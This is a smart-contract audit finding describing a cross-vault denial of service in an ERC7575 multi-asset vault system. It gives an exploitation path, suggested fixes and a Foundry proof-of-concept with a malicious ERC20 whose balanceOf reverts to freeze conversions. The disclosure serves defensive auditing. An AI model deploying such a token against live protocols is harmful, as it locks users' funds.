## Title
Cross-Vault Denial of Service via Malicious ERC20 Token in Multi-Asset Investment Layer

## Summary
In the Investment Layer (ERC7575VaultUpgradeable + ShareTokenUpgradeable), vaults handling different assets share a single ShareToken for conversion operations. When any vault converts assets to shares, the ShareToken iterates through ALL registered vaults and queries each vault's asset token via `balanceOf()`. A malicious token implementation in one vault can revert or consume excessive gas, causing a complete denial of service across ALL vaults in the multi-asset system.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ShareTokenUpgradeable.sol` (function `getCirculatingSupplyAndAssets`, lines 369-390) and `src/ERC7575VaultUpgradeable.sol` (functions `_convertToShares` line 1195, `_convertToAssets` line 1208, `totalAssets` line 1176)

**Intended Logic:** Each vault should be isolated in its operations. The multi-asset architecture is designed so that different assets (USDC, DAI, etc.) can have separate vaults sharing a single ShareToken for unified share accounting.

**Actual Logic:** The ShareToken's conversion functions create cross-vault dependencies by iterating through ALL registered vaults regardless of which vault initiated the conversion. This breaks vault isolation and creates a single point of failure.

**Exploitation Path:**

1. **Setup**: Multi-vault deployment with Vault A (USDC) and Vault B (malicious token) both registered to the same ShareTokenUpgradeable
2. **Investment Manager fulfills deposit in Vault A**: Calls `fulfillDeposit()` which internally calls `_convertToShares()` [1](#0-0) 
3. **Vault A requests conversion**: `_convertToShares()` calls `ShareTokenUpgradeable.convertNormalizedAssetsToShares()` [2](#0-1) 
4. **ShareToken iterates ALL vaults**: `convertNormalizedAssetsToShares()` calls `this.getCirculatingSupplyAndAssets()` [3](#0-2) , which loops through ALL registered vaults including Vault B [4](#0-3) 
5. **Vault B query triggers malicious behavior**: For Vault B, it calls `getClaimableSharesAndNormalizedAssets()` [5](#0-4) , which calls `totalAssets()` [6](#0-5) 
6. **Malicious token DOS**: `totalAssets()` calls the malicious token's `balanceOf()` [7](#0-6) , which either:
   - Reverts unconditionally, blocking all conversions
   - Consumes excessive gas (>30M), making transactions unprofitable or hitting block gas limits
7. **Result**: Vault A's `fulfillDeposit()` transaction fails, and ALL other vault operations requiring conversion also fail

**Security Property Broken:** Vault isolation is violated. The protocol assumes each vault operates independently, but the shared conversion logic creates cross-vault dependencies that enable one malicious vault to disable the entire multi-asset system.

## Impact Explanation

- **Affected Assets**: ALL assets in ALL vaults registered to the same ShareTokenUpgradeable instance (USDC, DAI, USDT, etc.)
- **Damage Severity**: Complete protocol shutdown. Critical operations become impossible:
  - Investment Manager cannot fulfill any deposit requests (`fulfillDeposit`, `fulfillDeposits`) [1](#0-0) [8](#0-7) 
  - Investment Manager cannot fulfill any redeem requests (`fulfillRedeem`) [9](#0-8) 
  - View functions fail (`convertToShares`, `convertToAssets`) [10](#0-9) [11](#0-10) 
  - Users' funds remain locked in pending state with no path to completion
  - Protocol must be redeployed or malicious vault must be unregistered (which requires vault to have zero assets/requests)
- **User Impact**: All users across all vaults are affected. Anyone with pending deposits/redeems cannot progress through the async lifecycle. New deposits cannot be fulfilled. The entire ERC-7540 async flow is broken.

## Likelihood Explanation

- **Attacker Profile**: Protocol owner or governance (trusted role) who registers the malicious vault. However, the vulnerability can also manifest if:
  - A legitimate token upgrades to a malicious implementation (common in upgradeable tokens)
  - A token has a bug that causes excessive gas consumption or reverts
  - A token implements non-standard behavior (e.g., blacklist that affects the vault address)
- **Preconditions**: 
  - Multi-vault deployment with ShareTokenUpgradeable
  - At least one malicious or buggy token registered as a vault asset
  - Any user or Investment Manager attempts vault operations requiring conversion
- **Execution Complexity**: Single transaction. Any call to affected functions immediately triggers the DOS. No special timing or complex setup required.
- **Frequency**: Permanent DOS until the malicious vault is removed (requires fulfilling all pending requests and having zero assets, which may be impossible if the token is malicious)

## Recommendation

Isolate each vault's conversion logic to avoid cross-vault dependencies. Instead of having ShareToken iterate through all vaults, each vault should calculate its own share-to-asset ratio locally.

```solidity
// In src/ERC7575VaultUpgradeable.sol, function _convertToShares (lines 1188-1196):

// CURRENT (vulnerable):
// Calls shared ShareToken function that iterates ALL vaults
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256 shares) {
    VaultStorage storage $ = _getVaultStorage();
    uint256 normalizedAssets = Math.mulDiv(assets, $.scalingFactor, 1);
    shares = ShareTokenUpgradeable($.shareToken).convertNormalizedAssetsToShares(normalizedAssets, rounding);
}

// FIXED:
// Calculate conversion locally using only this vault's data
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256 shares) {
    VaultStorage storage $ = _getVaultStorage();
    uint256 normalizedAssets = Math.mulDiv(assets, $.scalingFactor, 1);
    
    // Get total supply from ShareToken (no iteration needed)
    uint256 supply = IERC20Metadata($.shareToken).totalSupply();
    
    // Calculate this vault's normalized assets locally (isolated)
    uint256 vaultAssets = totalAssets(); // Only queries OUR asset token
    uint256 vaultNormalizedAssets = Math.mulDiv(vaultAssets, $.scalingFactor, 1);
    
    // Add virtual amounts for inflation protection
    supply += VIRTUAL_SHARES;
    vaultNormalizedAssets += VIRTUAL_ASSETS;
    
    // Convert using only this vault's ratio
    shares = Math.mulDiv(normalizedAssets, supply, vaultNormalizedAssets, rounding);
}

// Similar fix needed for _convertToAssets()
```

**Alternative Solution:** Implement try-catch around the external `balanceOf()` calls in `totalAssets()` to gracefully handle malicious tokens:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function totalAssets (line 1174):

function totalAssets() public view virtual returns (uint256) {
    VaultStorage storage $ = _getVaultStorage();
    uint256 balance;
    try IERC20Metadata($.asset).balanceOf(address(this)) returns (uint256 bal) {
        balance = bal;
    } catch {
        // If balanceOf fails, return 0 to isolate the failure
        // This prevents one vault's malicious token from DOSing others
        return 0;
    }
    uint256 reservedAssets = $.totalPendingDepositAssets + $.totalClaimableRedeemAssets + $.totalCancelDepositAssets;
    return balance > reservedAssets ? balance - reservedAssets : 0;
}
```

## Proof of Concept

```solidity
// File: test/Exploit_CrossVaultDOS.t.sol
// Run with: forge test --match-test test_CrossVaultDOS -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/ShareTokenUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

// Malicious token that reverts on balanceOf
contract MaliciousToken is ERC20 {
    bool public shouldRevert;
    
    constructor() ERC20("Malicious", "MAL") {
        shouldRevert = false;
    }
    
    function enableDOS() external {
        shouldRevert = true;
    }
    
    function balanceOf(address account) public view override returns (uint256) {
        if (shouldRevert) {
            revert("DOS triggered");
        }
        return super.balanceOf(account);
    }
    
    function decimals() public pure override returns (uint8) {
        return 18;
    }
}

contract Exploit_CrossVaultDOS is Test {
    ShareTokenUpgradeable shareToken;
    ERC7575VaultUpgradeable vaultUSDC;
    ERC7575VaultUpgradeable vaultMalicious;
    ERC20 usdc;
    MaliciousToken malicious;
    
    address owner = address(1);
    address investmentManager = address(2);
    address user = address(3);
    
    function setUp() public {
        // Deploy tokens
        usdc = new ERC20("USDC", "USDC");
        malicious = new MaliciousToken();
        
        // Deploy ShareToken
        vm.prank(owner);
        shareToken = new ShareTokenUpgradeable();
        shareToken.initialize("Shares", "SHR", owner);
        
        // Deploy vaults and register them
        vm.startPrank(owner);
        vaultUSDC = new ERC7575VaultUpgradeable();
        vaultUSDC.initialize(address(usdc), address(shareToken), owner);
        shareToken.registerVault(address(usdc), address(vaultUSDC));
        
        vaultMalicious = new ERC7575VaultUpgradeable();
        vaultMalicious.initialize(address(malicious), address(shareToken), owner);
        shareToken.registerVault(address(malicious), address(vaultMalicious));
        
        // Set investment manager
        shareToken.setInvestmentManager(investmentManager);
        vm.stopPrank();
        
        // Setup user with assets
        deal(address(usdc), user, 1000e6);
        deal(address(malicious), user, 1000e18);
    }
    
    function test_CrossVaultDOS() public {
        // SETUP: User deposits to USDC vault
        vm.startPrank(user);
        usdc.approve(address(vaultUSDC), 1000e6);
        vaultUSDC.requestDeposit(1000e6, user, user, "");
        vm.stopPrank();
        
        // Investment manager can fulfill before DOS
        vm.prank(investmentManager);
        uint256 shares = vaultUSDC.fulfillDeposit(user, 1000e6);
        assertGt(shares, 0, "Deposit fulfilled successfully before DOS");
        
        // EXPLOIT: Enable DOS on malicious token
        malicious.enableDOS();
        
        // VERIFY: Now fulfillDeposit fails for USDC vault due to malicious vault
        vm.startPrank(user);
        usdc.approve(address(vaultUSDC), 1000e6);
        vaultUSDC.requestDeposit(1000e6, user, user, "");
        vm.stopPrank();
        
        vm.prank(investmentManager);
        vm.expectRevert("DOS triggered");
        vaultUSDC.fulfillDeposit(user, 1000e6);
        
        // All conversion functions in USDC vault now fail
        vm.expectRevert("DOS triggered");
        vaultUSDC.convertToShares(100e6);
        
        vm.expectRevert("DOS triggered");
        vaultUSDC.convertToAssets(100e18);
    }
}
```

## Notes

- **Settlement Layer NOT Affected**: WERC7575Vault + WERC7575ShareToken use simple decimal scaling for conversions and do not iterate through all vaults. They are isolated and not vulnerable to this cross-vault DOS. [12](#0-11) 

- **Investment Layer ONLY**: This vulnerability specifically affects ERC7575VaultUpgradeable + ShareTokenUpgradeable (Investment Layer) because these contracts use the shared conversion logic that iterates all vaults. [13](#0-12) 

- **Root Cause**: The multi-asset architecture prioritizes unified share accounting over vault isolation. The `getCirculatingSupplyAndAssets()` function aggregates data from all vaults to calculate accurate conversion rates, but this creates a dependency chain where any vault's failure cascades to all others.

- **Remediation Priority**: HIGH - This is a critical architectural flaw that violates the fundamental assumption of vault isolation in multi-asset systems. Each vault should be independently operable regardless of other vaults' states.

- **Affected Operations**: Any operation requiring asset-to-share or share-to-asset conversion:
  - `fulfillDeposit()` and `fulfillDeposits()` - Investment Manager cannot process deposits
  - `fulfillRedeem()` - Investment Manager cannot process redemptions  
  - Public view functions `convertToShares()` and `convertToAssets()` - Users cannot preview conversions
  - Internal conversions in other contract logic

### Citations

**File:** src/ERC7575VaultUpgradeable.sol (L433-433)
```text
        shares = _convertToShares(assets, Math.Rounding.Floor);
```

**File:** src/ERC7575VaultUpgradeable.sol (L469-469)
```text
            uint256 shareAmount = _convertToShares(assetAmount, Math.Rounding.Floor);
```

**File:** src/ERC7575VaultUpgradeable.sol (L831-831)
```text
        assets = _convertToAssets(shares, Math.Rounding.Floor);
```

**File:** src/ERC7575VaultUpgradeable.sol (L1176-1176)
```text
        uint256 balance = IERC20Metadata($.asset).balanceOf(address(this));
```

**File:** src/ERC7575VaultUpgradeable.sol (L1195-1195)
```text
        shares = ShareTokenUpgradeable($.shareToken).convertNormalizedAssetsToShares(normalizedAssets, rounding);
```

**File:** src/ERC7575VaultUpgradeable.sol (L1224-1224)
```text
        return _convertToShares(assets, Math.Rounding.Floor);
```

**File:** src/ERC7575VaultUpgradeable.sol (L1233-1233)
```text
        return _convertToAssets(shares, Math.Rounding.Floor);
```

**File:** src/ERC7575VaultUpgradeable.sol (L1535-1535)
```text
        uint256 vaultAssets = totalAssets();
```

**File:** src/ShareTokenUpgradeable.sol (L369-390)
```text
    function getCirculatingSupplyAndAssets() external view returns (uint256 circulatingSupply, uint256 totalNormalizedAssets) {
        ShareTokenStorage storage $ = _getShareTokenStorage();
        uint256 totalClaimableShares = 0;
        uint256 length = $.assetToVault.length();

        for (uint256 i = 0; i < length; i++) {
            (, address vaultAddress) = $.assetToVault.at(i);

            // Get both claimable shares and normalized assets in a single call for gas efficiency
            (uint256 vaultClaimableShares, uint256 vaultNormalizedAssets) = IERC7575Vault(vaultAddress).getClaimableSharesAndNormalizedAssets();
            totalClaimableShares += vaultClaimableShares;
            totalNormalizedAssets += vaultNormalizedAssets;
        }

        // Add invested assets from the investment ShareToken (if configured)
        totalNormalizedAssets += _calculateInvestmentAssets();

        // Get total supply
        uint256 supply = totalSupply();
        // Calculate circulating supply: total supply minus vault-held shares for redemption claims
        circulatingSupply = totalClaimableShares > supply ? 0 : supply - totalClaimableShares;
    }
```

**File:** src/ShareTokenUpgradeable.sol (L703-703)
```text
        (uint256 circulatingSupply, uint256 totalNormalizedAssets) = this.getCirculatingSupplyAndAssets();
```

**File:** src/WERC7575Vault.sol (L215-220)
```text
    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256) {
        // ShareToken always has 18 decimals, assetDecimals ∈ [6, 18]
        // shares = assets * _scalingFactor where _scalingFactor = 10^(18 - assetDecimals)
        // Use Math.mulDiv to prevent overflow on large amounts
        return Math.mulDiv(assets, uint256(_scalingFactor), 1, rounding);
    }
```
